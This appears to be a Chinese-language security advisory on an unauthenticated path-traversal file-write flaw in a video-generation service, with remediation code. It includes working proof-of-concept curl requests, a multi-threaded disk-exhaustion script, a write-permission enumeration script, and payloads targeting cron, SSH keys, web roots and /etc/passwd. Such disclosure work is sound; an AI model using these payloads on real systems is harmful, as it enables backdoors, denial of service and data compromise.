# VULN-DF-PY-002: save_disk_path 未验证路径致任意文件写入

## 漏洞摘要

| 字段 | 值 |
|-------|-------|
| **ID** | VULN-DF-PY-002 |
| **类型** | 路径遍历（写入） |
| **CWE** | CWE-22: 路径名限制不当（Improper Limitation of a Pathname to a Restricted Directory） |
| **严重程度** | 高 |
| **置信度** | 85（已确认） |
| **位置** | `examples/service/worker.py:195-201` |
| **函数** | `generate()` |
| **源模块** | examples/service |

## 漏洞描述

来自 HTTP 请求的 `save_disk_path` 字段在没有任何路径验证或清理的情况下直接传递给 `save_video()`。攻击者可以通过在 `save_disk_path` 参数中使用路径遍历序列（`../`）利用此漏洞将文件写入服务器上的任意位置。

### 漏洞代码

```python
# examples/service/worker.py:195-201
save_video(
    tensor=video[None],
    save_file=request.save_disk_path,
    fps=request.sample_fps,
    nrow=1,
    normalize=True,
    value_range=(-1, 1))
```

### 攻击链

```
HTTP POST /generate → GeneratorRequest(save_disk_path=...) → worker.py:generate() → save_video(save_file=request.save_disk_path)
```

## 利用分析

### 攻击向量

1. **网络可访问**：服务绑定到 `0.0.0.0:6000`，**无需身份验证**
2. **直接输入**：`save_disk_path` 字段是 Pydantic `Optional[str]` 类型，除了类型检查外没有其他验证
3. **无清理**：无路径遍历检查、无白名单、无符号链接检查
4. **用户控制的输出**：攻击者决定路径和内容（通过视频生成参数）

### 利用场景

#### 场景 1：关键系统文件覆盖

```http
POST /generate HTTP/1.1
Host: target-server:6000
Content-Type: application/json

{
    "prompt": "malicious content",
    "sample_steps": 40,
    "save_disk_path": "/etc/cron.d/malicious_job"
}
```

**影响**: 
- 写入执行攻击者控制命令的 cron 作业文件
- 持久化后门安装
- 如果 cron 以提升的权限运行，可能导致权限提升

#### 场景 2：SSH Authorized Keys 注入

```json
{
    "prompt": "test",
    "sample_steps": 40,
    "save_disk_path": "/root/.ssh/authorized_keys.mp4"
}
```

**影响**: 
- 尽管文件扩展名为 `.mp4`，攻击者可以：
  - 通过后续请求重命名
  - 利用忽略扩展名的错误配置系统
  - 用于拒绝服务（填满磁盘）

#### 场景 3：Web Shell 部署

```json
{
    "prompt": "test",
    "sample_steps": 40,
    "save_disk_path": "/var/www/html/shell.mp4"
}
```

**影响**: 
- 如果 Web 服务器正在运行，文件可能可访问
- 结合其他漏洞，可能实现远程代码执行

#### 场景 4：通过磁盘填充进行拒绝服务

```json
{
    "prompt": "fill disk",
    "sample_steps": 50,
    "frame_num": 201,
    "save_disk_path": "/dev/null.mp4"
}
```

**影响**: 
- 大型视频文件消耗磁盘空间
- 多个并行请求（Ray 分布式工作器）放大攻击
- 系统不稳定，服务不可用

#### 场景 5：配置文件投毒

```json
{
    "save_disk_path": "/data/models/config_override.mp4"
}
```

**影响**: 
- 投毒模型配置目录
- 干扰合法的模型加载
- 可能导致供应链攻击

#### 场景 6：/dev/null 绕过和日志投毒

```json
{
    "save_disk_path": "/var/log/app.log.mp4"
}
```

**影响**: 
- 破坏日志文件
- 隐藏攻击证据
- 干扰监控系统

### 通过 Ray 分布式执行放大

该服务使用 Ray 在多个工作器之间分布式生成视频：

```python
# server.py
self.workers = [
    GeneratorWorker.remote(args, rank=rank, world_size=world_size)
    for rank in range(num_workers)  # 默认为 8 个工作器
]

# 攻击放大：所有 8 个工作器可能写入同一路径
results = ray.get([
    worker.generate.remote(request)
    for worker in self.workers
])
```

**放大效应**: 单个请求同时触发最多 8 个工作器的写入，使得：
- 更快的磁盘耗尽
- 竞态条件利用
- 增加的攻击面

### 影响评估

| 影响类别 | 严重程度 | 描述 |
|-----------------|----------|-------------|
| **文件系统危害** | **严重** | 任意文件写入支持系统文件修改、后门安装 |
| **权限提升** | **高** | Cron 作业、systemd 单元、SSH 密钥可能启用 root 访问 |
| **拒绝服务** | **高** | 磁盘耗尽、关键文件损坏 |
| **数据完整性** | **高** | 模型文件、配置投毒 |
| **远程代码执行** | **中** | 可能通过 cron/Web Shell 部署实现 |
| **业务影响** | **严重** | 系统危害、数据丢失、服务中断 |

### 攻击先决条件

| 要求 | 状态 |
|-------------|--------|
| 端口 6000 的网络访问 | 必需（假设无防火墙） |
| 身份验证 | **无** - 服务无需身份验证 |
| 文件权限 | 目标目录中的写入权限 |
| 目录遍历 | 某些目录可能受写入保护 |

## 概念验证

### 基本路径遍历写入测试

```bash
# 测试相对路径遍历
curl -X POST http://target:6000/generate \
  -H "Content-Type: application/json" \
  -d '{"prompt":"test","sample_steps":40,"save_disk_path":"../../../tmp/malicious.mp4"}'

# 测试绝对路径写入
curl -X POST http://target:6000/generate \
  -H "Content-Type: application/json" \
  -d '{"prompt":"test","sample_steps":40,"save_disk_path":"/tmp/pwned.mp4"}'
```

### 关键文件覆盖攻击

```bash
# 尝试覆盖系统文件（需要适当的权限）
curl -X POST http://target:6000/generate \
  -H "Content-Type: application/json" \
  -d '{"prompt":"backdoor","sample_steps":40,"save_disk_path":"/etc/cron.d/backdoor"}'
```

### 磁盘耗尽攻击

```python
#!/usr/bin/env python3
import requests
import sys
import threading

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:6000"
THREADS = 50

def exhaust_disk():
    """发送大型视频生成请求。"""
    requests.post(f"{TARGET}/generate", json={
        "prompt": "disk fill attack",
        "sample_steps": 50,  # 最大步数
        "frame_num": 201,    # 最大帧数（每个视频约 40MB+）
        "save_disk_path": f"/tmp/fill_{threading.current_thread().name}.mp4"
    })

if __name__ == "__main__":
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=exhaust_disk, name=f"fill_{i}")
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    print(f"启动了 {THREADS} 个磁盘耗尽请求")
```

### 枚举和写入测试

```python
#!/usr/bin/env python3
import requests
import os

WRITE_TARGETS = [
    "/tmp/test_write.mp4",
    "/var/tmp/test.mp4",
    "/data/test.mp4",
    "/home/test.mp4",
    "/root/test.mp4",
]

def test_write_permission(target, path):
    try:
        r = requests.post(f"{target}/generate", json={
            "prompt": "permission test",
            "sample_steps": 10,
            "save_disk_path": path
        }, timeout=30)
        
        if r.status_code == 200:
            print(f"[可写入] {path}")
        elif "Permission denied" in r.text or "cannot open" in r.text:
            print(f"[不可写入] {path}")
        else:
            print(f"[未知] {path} - 状态码：{r.status_code}")
    except Exception as e:
        print(f"[错误] {path} - {e}")

if __name__ == "__main__":
    target = "http://localhost:6000"
    for p in WRITE_TARGETS:
        test_write_permission(target, p)
```

## 根本原因分析

### 为什么存在此漏洞

1. **缺少输入验证**：Pydantic 模型仅验证类型（Optional[str]），不验证内容
2. **直接使用文件 API**：`save_video()` 直接使用，没有安全的包装器
3. **无目录白名单**：用户可以指定文件系统上的任何路径
4. **用户控制的输出**：视频内容基于攻击者提供的参数生成
5. **Ray 放大**：多个工作器可能同时写入

### 默认路径行为分析

```python
# worker.py:187-192 - 默认路径生成（当 save_disk_path 为 None 时）
if request.save_disk_path is None:
    formatted_time = datetime.datetime.now(tz=datetime.timezone.utc).strftime("%Y%m%d_%H%M%S")
    formatted_prompt = request.prompt.replace(" ", "_").replace("/", "_")[:50]
    suffix = '.mp4'
    size_format = request.size.replace('*', 'x') if sys.platform == 'win32' else request.size
    request.save_disk_path = f"{size_format}_{formatted_prompt}_{formatted_time}{suffix}"
```

**观察**: 即使是默认路径生成也只有最少的清理：
- `prompt.replace("/", "_")` - 仅清理正斜杠
- 无反斜杠清理（Windows 上的 `\`）
- 无 `..` 遍历防护
- 无绝对路径检查

### 未使用的安全控制

项目在 `mindiesd/utils/file_utils.py` 中有 `safe_open()` 函数，具有全面的检查：
- 符号链接检查
- 路径长度限制（4096 个字符）
- 权限验证
- 所有者验证

**但这些都没有在 save_video 路径中使用！**

## 修复建议

### 优先级：P0（严重 - 立即修复）

### 1. 路径验证和目录白名单

```python
# 在 worker.py 中 - 添加路径验证
import os
from pathlib import Path

OUTPUT_DIR = "/data/output"  # 白名单输出目录

def validate_output_path(output_path: str) -> str:
    """验证输出路径在允许的目录内。"""
    if output_path is None:
        return None
    
    # 标准化并解析路径
    abs_path = os.path.realpath(os.path.join(OUTPUT_DIR, output_path))
    
    # 验证路径在白名单内
    allowed_dir = os.path.realpath(OUTPUT_DIR)
    if not abs_path.startswith(allowed_dir + "/"):
        raise ValueError(f"输出路径必须在 {OUTPUT_DIR} 内")
    
    # 检查符号链接
    if os.path.islink(output_path):
        raise ValueError("不允许使用符号链接")
    
    # 验证扩展名
    if Path(abs_path).suffix.lower() != ".mp4":
        raise ValueError("输出必须是 .mp4 文件")
    
    # 防止在白名单外创建目录
    parent_dir = os.path.dirname(abs_path)
    if not os.path.exists(parent_dir):
        raise ValueError("输出目录必须存在")
    
    return abs_path

# 在 generate() 中使用
if request.save_disk_path is not None:
    request.save_disk_path = validate_output_path(request.save_disk_path)
else:
    # 在白名单内生成默认路径
    request.save_disk_path = generate_safe_default_path()

save_video(tensor=video[None], save_file=request.save_disk_path, ...)
```

### 2. 使用现有的安全文件工具

```python
from mindiesd.utils.file_utils import standardize_path, check_dir_safety

def validate_save_path(path: str):
    """使用现有的安全工具验证保存路径。"""
    if path is None:
        return None
    
    # 检查父目录安全性
    parent_dir = os.path.dirname(path)
    check_dir_safety(parent_dir, permission_mode=0o750)
    
    # 标准化并验证路径
    safe_path = standardize_path(path, check_link=True)
    
    # 验证在允许的输出目录内
    OUTPUT_DIR = "/data/output"
    if not safe_path.startswith(os.path.realpath(OUTPUT_DIR)):
        raise ValueError(f"输出必须在 {OUTPUT_DIR} 内")
    
    return safe_path
```

### 3. 添加身份验证（与 VULN-DF-PY-001 相同）

```python
from fastapi import Depends, HTTPException, status
from fastapi.security import HTTPBearer

security = HTTPBearer()

@app.post("/generate")
async def generate_image(
    request: GeneratorRequest,
    _: HTTPAuthorizationCredentials = Depends(security)
):
    # 现有逻辑
```

### 4. 速率限制（防止磁盘耗尽）

```python
from fastapi import FastAPI
from fastapi_limiter import FastAPILimiter
from fastapi_limiter.depends import RateLimiter

app = FastAPI()

@app.post("/generate", dependencies=[Depends(RateLimiter(times=5, seconds=60))])
async def generate_image(request: GeneratorRequest):
    # 限制：每 60 秒每个 IP 最多 5 个请求
```

### 5. 磁盘空间监控

```python
import shutil

MIN_DISK_SPACE_GB = 10

def check_disk_space(path: str):
    """写入前确保有足够的磁盘空间。"""
    stat = shutil.disk_usage(os.path.dirname(path))
    free_gb = stat.free / (1024**3)
    if free_gb < MIN_DISK_SPACE_GB:
        raise ValueError(f"磁盘空间不足：剩余 {free_gb:.2f}GB")
```

### 6. 文件大小限制

```python
MAX_VIDEO_SIZE_MB = 500

def save_video_with_limits(tensor, save_file, **kwargs):
    """保存视频时进行大小限制。"""
    # 生成前检查预期大小
    expected_size_mb = estimate_video_size(tensor.shape, kwargs.get('frame_num', 81))
    if expected_size_mb > MAX_VIDEO_SIZE_MB:
        raise ValueError(f"视频过大：{expected_size_mb}MB 超过 {MAX_VIDEO_SIZE_MB}MB 限制")
    
    save_video(tensor=tensor, save_file=save_file, **kwargs)
```

## 组合攻击场景（VULN-001 + VULN-002）

这两个漏洞可以组合使用以产生最大影响：

1. **读 + 写链**：
   - 读取 `/proc/self/environ` 提取密钥（VULN-001）
   - 使用密钥确定攻击策略
   - 写入后门文件（VULN-002）

2. **完全系统危害**：
   ```json
   {
       "image": "/etc/passwd",  // 枚举用户（读取）
       "save_disk_path": "/etc/cron.d/persistence",  // 安装后门（写入）
       "prompt": "malicious"
   }
   ```

## 测试建议

1. **单元测试**： 
   - 路径遍历防护测试
   - 白名单边界测试
   - 符号链接拒绝测试

2. **集成测试**：
   - 身份验证流程
   - 速率限制有效性
   - 磁盘空间监控

3. **安全回归测试**：
   - 自动化路径遍历模糊测试
   - 权限边界测试

## 参考资料

- [CWE-22: Improper Limitation of a Pathname](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
